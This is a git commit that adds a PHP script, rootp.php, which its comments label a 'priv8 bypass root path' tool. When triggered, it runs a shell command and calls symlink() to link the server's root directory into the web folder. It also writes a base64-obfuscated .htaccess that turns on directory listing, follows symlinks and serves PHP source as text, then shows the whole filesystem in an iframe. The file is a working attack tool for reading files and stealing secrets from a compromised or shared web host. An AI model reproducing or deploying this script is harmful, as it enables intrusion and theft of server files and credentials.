e29f3c4a96e2231032f34493a39765911909c87b
pwnsauce403 <40787695+pwnsauce403@users.noreply.github.com>
2024-07-28 13:41:14 +0700

    Add files via upload

---
+++ tahi/rootp.php
@@ -0,0 +1,14 @@
+<!--priv8 bypass root path decoded & recoded by pwnsauce - foursdeath-->
+<!--fck u-->
+<style type="text/css">body {background-color: #151515; font-family:Courier	
+margin-left: 0px; margin-top: 0px; text-align: center;</style>
+<br /><br /><body><tr><td>
+<?PhP
+echo "<form method='POST' action=''>" ; echo "
+<center><input type='submit' value='ewe' name='fsdth'></center>"; 
+if (isset($_POST['fsdth'])){ system('ln -s / fsdth.txt'); 
+$x = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
+$y = fopen(".htaccess","w+"); $write = fwrite ($y ,base64_decode($x)); $fsdth = symlink("/","fsdth.txt"); 
+$z = "<br><a href=fsdth.txt TARGET='_blank'></a><br><br><iframe src='fsdth.txt' width='800' height='500'></iframe>"; 
+echo "<br>$z</center>";} echo "</form>";  ?></td></tr></body></html>
+<!--end-->
